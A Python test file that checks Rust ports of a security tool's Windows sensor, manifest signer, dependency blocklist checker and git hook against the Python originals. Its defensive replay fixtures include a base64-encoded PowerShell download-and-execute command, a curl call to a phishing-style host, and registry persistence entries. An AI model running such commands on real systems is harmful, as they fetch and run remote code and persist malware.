"""The Python tools ported to Rust, side by side with the originals.

- `guard sensor` against windows/windows_sensor.py (the detection layer: the
  selftest, and recorded events replayed through both)
- release/ (sign-manifest) against release/sign_manifest.py: same manifest bytes
  and signatures
- `guard deps check --blocklist` against malware-feed/check_deps.py
- hooks/guard-scan-hook.sh, which now runs the guard binary
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from rustbin import EXE, ROOT, WINDOWS, clean_env, run_rust, rust_guard  # noqa: F401  (fixture)


def text(b: bytes) -> str:
    return b.decode().replace("\r\n", "\n")


def run_py(*args: str, env: dict | None = None, cwd=None) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, *args], capture_output=True, env=clean_env(env), timeout=120, cwd=cwd)


# ---------------------------------------------------------------------------
# guard sensor
# ---------------------------------------------------------------------------
def test_sensor_selftest_matches_python(rust_guard):
    py = run_py(str(ROOT / "windows" / "windows_sensor.py"), "--selftest")
    rs = run_rust(rust_guard, "sensor", "--selftest")
    assert py.returncode == rs.returncode == 0, (py.stderr, rs.stderr)
    assert text(rs.stdout) == text(py.stdout)
    assert "selftest: 8 finding(s); clean control produced none = OK" in text(rs.stdout)


# Base64 like tests/samples.py: in plain text this command line is an IOC Guard
# flags, and tests/test_detection_accuracy.py sweeps this repo for exactly that.
DOWNLOAD_EXEC = base64.b64decode("cG93ZXJzaGVsbCAtTm9QIC1XIEhpZGRlbiAtYyBJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL3gnKQ==").decode()

EVENTS = [
    # A. staging in temp, by extension and marker
    {"type": "file_create", "path": r"C:\Users\dev\AppData\Local\Temp\stage9.py", "image": r"C:\Program Files\nodejs\node.exe"},
    {"type": "file_create", "path": r"C:\Users\Public\x.HTA", "image": "mshta.exe"},
    {"type": "file_create", "path": r"C:\Windows\Temp\.ps1"},
    {"type": "file_create", "path": r"C:\Users\dev\AppData\Roaming\pkg\font.woff2", "looks_like_text": True},
    {"type": "file_create", "path": r"D:\site\public\fonts\real.woff2", "looks_like_text": False},
    {"type": "file_create", "path": r"D:\site\public\fonts\fake.woff2", "looks_like_text": 1},
    {"type": "file_create", "path": "%TEMP%/drop.vbs"},
    # process trees, temp interpreters, IOCs
    {"type": "process_create", "image": r"C:\Windows\System32\cmd.exe", "parent_image": r"C:\Program Files\nodejs\node.exe",
     "cmdline": r"cmd /c python C:\Users\dev\AppData\Local\Temp\stage9.py"},
    {"type": "process_create", "image": "PowerShell.EXE", "parent_image": r"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\Code.exe",
     "cmdline": DOWNLOAD_EXEC},
    {"type": "process_create", "image": "shutdown.exe", "parent_image": "wscript.exe", "cmdline": "SHUTDOWN /r /t 0"},
    {"type": "process_create", "image": "notepad.exe", "parent_image": "explorer.exe", "cmdline": "notepad shutdown-notes.txt"},
    {"type": "process_create", "image": "curl.exe", "parent_image": "explorer.exe", "cmdline": "curl https://auth-confirm-ten.vercel.app/x"},
    {"type": "process_create", "image": r"C:\Windows\explorer.exe", "parent_image": r"C:\Windows\winlogon.exe", "cmdline": "explorer.exe"},
    {"type": "process_create"},
    # B. registry persistence, with and without indicators
    {"type": "registry_set", "key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "value_name": "Updater",
     "value_data": r"python C:\Users\dev\AppData\Local\Temp\stage9.py", "image": "python.exe"},
    {"type": "registry_set", "key": r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "value_name": "x", "value_data": "C:\\Tools\\ok.exe"},
    {"type": "registry_set", "key": r"HKLM\System\CurrentControlSet\Services\evil\ImagePath", "value_data": "powershell -enc AAAA"},
    {"type": "registry_set", "key": r"HKCU\Software\Vendor\Settings", "value_data": "python"},
    # C. reboots: unexpected, forced, bursts in and out of the 3-hour window
    {"type": "reboot", "event_id": 41, "ts": "2026-10-01T09:00:00+00:00"},
    {"type": "reboot", "event_id": 6006, "ts": "2026-10-01T14:00:00+00:00"},
    {"type": "reboot", "event_id": 1074, "initiator": r"C:\Windows\System32\shutdown.exe (HOST)", "ts": "2026-10-01T15:30:00+00:00"},
    {"type": "reboot", "event_id": "6008", "ts": "2026-10-01T16:00:00.250000+00:00"},
    {"type": "reboot", "event_id": 1074, "initiator": "ExitWindowsEx", "ts": "2026-10-02T09:00:00+00:00"},
    {"type": "reboot", "event_id": 1075, "ts": "2026-10-02T13:00:00+00:00"},
    {"type": "unknown"},
]

PY_DETECTOR = r"""
import json, sys
from datetime import datetime
sys.path.insert(0, sys.argv[1])
import windows_sensor as ws
det = ws.WindowsDetector(ws.load_signatures())
out = []
for line in open(sys.argv[2], encoding="utf-8"):
    ev = json.loads(line)
    if "ts" in ev:
        ev["ts_dt"] = datetime.fromisoformat(ev["ts"])
    for f in det.dispatch(ev):
        out.append({"kind": f"win:{f.event_type}", "rule": f.rule, "severity": f.severity,
                    "summary": f.summary, "evidence": f.evidence})
print(json.dumps(out))
"""


def test_sensor_replay_matches_python(rust_guard, tmp_path):
    events = tmp_path / "events.jsonl"
    events.write_text("".join(json.dumps(e) + "\n" for e in EVENTS), encoding="utf-8")
    py = run_py("-c", PY_DETECTOR, str(ROOT / "windows"), str(events))
    assert py.returncode == 0, py.stderr
    expected = json.loads(py.stdout)

    home = tmp_path / "home"
    rs = run_rust(rust_guard, "sensor", "--replay", str(events), env={"GUARD_HOME": str(home)})
    assert rs.returncode == 1, rs.stderr  # findings
    alerts = [json.loads(ln) for ln in (home / "alerts.jsonl").read_text(encoding="utf-8").splitlines()]
    for a in alerts:
        assert a.pop("ts").endswith("+00:00")
    assert alerts == expected
    assert {a["rule"] for a in alerts} == {
        "win.temp.script_drop", "win.fake_font_drop", "win.suspicious_spawn", "win.interp_from_temp",
        "win.script_initiated_reboot", "win.cmdline_ioc", "win.registry_persistence", "win.reboot_burst",
        "win.forced_reboot", "win.unexpected_reboot"}
    log = (home / "windows_sensor.log").read_text(encoding="utf-8").splitlines()
    assert len(log) == len(alerts) and all("  ALERT [" in ln for ln in log)

    clean = tmp_path / "clean.jsonl"
    clean.write_text(json.dumps(EVENTS[12]) + "\n\n", encoding="utf-8")
    rs = run_rust(rust_guard, "sensor", "--replay", str(clean), env={"GUARD_HOME": str(tmp_path / "h2")})
    assert rs.returncode == 0 and not (tmp_path / "h2" / "alerts.jsonl").exists()


def test_sensor_arguments(rust_guard, tmp_path):
    rs = run_rust(rust_guard, "sensor", "--help")
    assert rs.returncode == 0 and text(rs.stdout).startswith("usage: guard sensor")
    for args in (["--bogus"], ["--replay"], ["--signatures"]):
        rs = run_rust(rust_guard, "sensor", *args)
        assert rs.returncode == 2 and b"usage: guard sensor" in rs.stderr
    rs = run_rust(rust_guard, "sensor", "--replay", str(tmp_path / "missing.jsonl"))
    assert rs.returncode == 1 and b"missing.jsonl" in rs.stderr
    bad = tmp_path / "bad.jsonl"
    bad.write_text("{}\nnot json\n")
    rs = run_rust(rust_guard, "sensor", "--replay", str(bad), env={"GUARD_HOME": str(tmp_path / "h")})
    assert rs.returncode == 1 and b"bad.jsonl:2:" in rs.stderr
    # a custom signature set
    sig = tmp_path / "sig.json"
    sig.write_text(json.dumps({"windows": {"temp_dir_markers": ["\\scratch\\"], "suspicious_temp_ext": [".txt"]}}))
    ev = tmp_path / "ev.jsonl"
    ev.write_text(json.dumps({"type": "file_create", "path": r"C:\scratch\a.txt"}) + "\n")
    rs = run_rust(rust_guard, "sensor", "--signatures", str(sig), "--replay", str(ev), env={"GUARD_HOME": str(tmp_path / "h3")})
    assert rs.returncode == 1 and b"win.temp.script_drop" in rs.stdout
    if not WINDOWS:
        rs = run_rust(rust_guard, "sensor", env={"GUARD_HOME": str(tmp_path / "h4")})
        assert rs.returncode == 2 and b"Windows only" in rs.stderr


# ---------------------------------------------------------------------------
# release/ sign-manifest
# ---------------------------------------------------------------------------
@pytest.fixture(scope="session")
def signer() -> Path:
    candidates = [ROOT / "release" / "target" / t / f"sign-manifest{EXE}" for t in ("release", "debug")]
    for c in candidates:
        if c.is_file():
            return c
    msg = "sign-manifest not built; cargo build --manifest-path release/Cargo.toml"
    if os.environ.get("CI"):
        pytest.fail(msg)
    pytest.skip(msg)


def test_signer_matches_python(signer, tmp_path):
    key = tmp_path / "k"
    key.write_bytes(bytes(range(7, 39)))
    (tmp_path / "guard-linux-x64").write_bytes(b"bin-a")
    (tmp_path / "guard-windows-x64.exe").write_bytes(b"bin-b" * 1000)
    args = ["build-and-sign", "--version", "1.2.3", "--min-version", "1.0.0", "--key", str(key),
            "--base-url", "https://x.example/dl/", "--blocklist", str(ROOT / "malware-feed" / "malware-blocklist.json"),
            "--binary", f"windows-x64={tmp_path / 'guard-windows-x64.exe'}", "--binary", f"linux-x64={tmp_path / 'guard-linux-x64'}"]
    outs = {}
    for impl in ("py", "rs"):
        d = tmp_path / impl
        d.mkdir()
        cmd = [sys.executable, str(ROOT / "release" / "sign_manifest.py")] if impl == "py" else [str(signer)]
        r = subprocess.run([*cmd, *args, "--out", str(d / "manifest.json")], capture_output=True)
        assert r.returncode == 0, r.stderr
        shutil.copy(d / "manifest.json", d / "m2.json")
        r = subprocess.run([*cmd, "sign", str(d / "m2.json"), "--key", str(key)], capture_output=True)
        assert r.returncode == 0, r.stderr
        assert text(r.stdout).splitlines()[1] == "verify: True"
        outs[impl] = {n: (d / n).read_bytes() for n in ("manifest.json", "manifest.json.sig", "m2.json.sig")}
    assert outs["rs"] == outs["py"]
    m = json.loads(outs["rs"]["manifest.json"])
    assert m["binary"]["linux-x64"]["url"] == "https://x.example/dl/guard-linux-x64"
    assert m["min_version"] == "1.0.0"


def test_signer_keygen_and_errors(signer, tmp_path):
    out = tmp_path / "new.key"
    r = subprocess.run([str(signer), "keygen", "--out", str(out)], capture_output=True)
    assert r.returncode == 0, r.stderr
    seed = out.read_bytes()
    assert len(seed) == 32
    # the printed public key is the one the Python Ed25519 derives
    pk = run_py("-c", "import sys; sys.path.insert(0, sys.argv[1]); import ed25519_pure;"
                "print(ed25519_pure.publickey(open(sys.argv[2], 'rb').read()).hex())", str(ROOT), str(out))
    assert pk.stdout.decode().strip() in r.stdout.decode()
    if not WINDOWS:
        assert out.stat().st_mode & 0o777 == 0o600
    short = tmp_path / "short.key"
    short.write_bytes(b"x" * 31)
    for args in ([], ["bogus"], ["sign"], ["sign", "m.json"], ["build-and-sign", "--key", str(out)],
                 ["sign", "m.json", "--key", str(short)], ["keygen", "--nope", "x"]):
        r = subprocess.run([str(signer), *args], capture_output=True, cwd=tmp_path)
        assert r.returncode == 2, (args, r.stdout, r.stderr)
        assert b"sign-manifest: error:" in r.stderr
    (tmp_path / "m.json").write_text("{}")
    r = subprocess.run([str(signer), "sign", "m.json", "--key", str(short)], capture_output=True, cwd=tmp_path)
    assert r.returncode == 2 and b"32-byte seed" in r.stderr


# ---------------------------------------------------------------------------
# guard deps check --blocklist (check_deps.py's option)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("target", ["testdata/fake-infected-repo", "testdata/clean-repo", "flagged"])
def test_deps_check_blocklist_matches_check_deps(rust_guard, tmp_path, target):
    bl = tmp_path / "bl.json"
    bl.write_text(json.dumps({"npm": {"evil-pkg": ["< 9.9.9"]}, "pip": {"bad-py": [">= 0"]}}))
    if target == "flagged":
        repo = tmp_path / "flagged"
        repo.mkdir()
        (repo / "package.json").write_text(json.dumps({"dependencies": {"evil-pkg": "1.0.0", "react": "18"}}))
        (repo / "requirements.txt").write_text("bad-py==1.2\nrequests\n")
        target = str(repo)
    py = run_py(str(ROOT / "malware-feed" / "check_deps.py"), target, "--blocklist", str(bl), cwd=ROOT)
    for args in (["--blocklist", str(bl)], [f"--blocklist={bl}"]):
        rs = run_rust(rust_guard, "deps", "check", target, *args, env={"GUARD_HOME": str(tmp_path / "home")}, cwd=ROOT)
        assert rs.returncode == py.returncode, (py.stdout, rs.stdout, rs.stderr)
        assert text(rs.stdout) == text(py.stdout)
    rs = run_rust(rust_guard, "deps", "check", target, "--blocklist", str(tmp_path / "nope.json"),
                  env={"GUARD_HOME": str(tmp_path / "home")}, cwd=ROOT)
    assert rs.returncode == 1 and b"nope.json" in rs.stderr


# ---------------------------------------------------------------------------
# the git hook
# ---------------------------------------------------------------------------
@pytest.mark.skipif(WINDOWS or not shutil.which("git"), reason="POSIX shell hook")
@pytest.mark.parametrize("fixture", ["fake-infected-repo", "clean-repo"])
def test_git_hook_runs_the_binary(rust_guard, tmp_path, fixture):
    repo = tmp_path / "repo"
    shutil.copytree(ROOT / "testdata" / fixture, repo)
    git = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True, env=clean_env(git))
    home = tmp_path / "home"
    r = subprocess.run(["sh", str(ROOT / "hooks" / "guard-scan-hook.sh")], cwd=repo, capture_output=True,
                       env=clean_env({**git, "GUARD_HOME": str(home), "GUARD_BIN": str(rust_guard)}))
    assert r.returncode == 0
    assert str(repo.resolve()) in (home / "hook.log").read_text()
    if fixture == "clean-repo":
        assert r.stderr == b""
    else:
        assert b"DO NOT OPEN THIS FOLDER IN VS CODE" in r.stderr
        assert b"Supply-chain signatures detected" in r.stderr
    # no binary anywhere: the hook steps aside
    r = subprocess.run(["sh", str(ROOT / "hooks" / "guard-scan-hook.sh")], cwd=repo, capture_output=True,
                       env={**git, "PATH": "/usr/bin:/bin", "HOME": str(tmp_path / "nohome")})
    assert r.returncode == 0 and r.stderr == b""
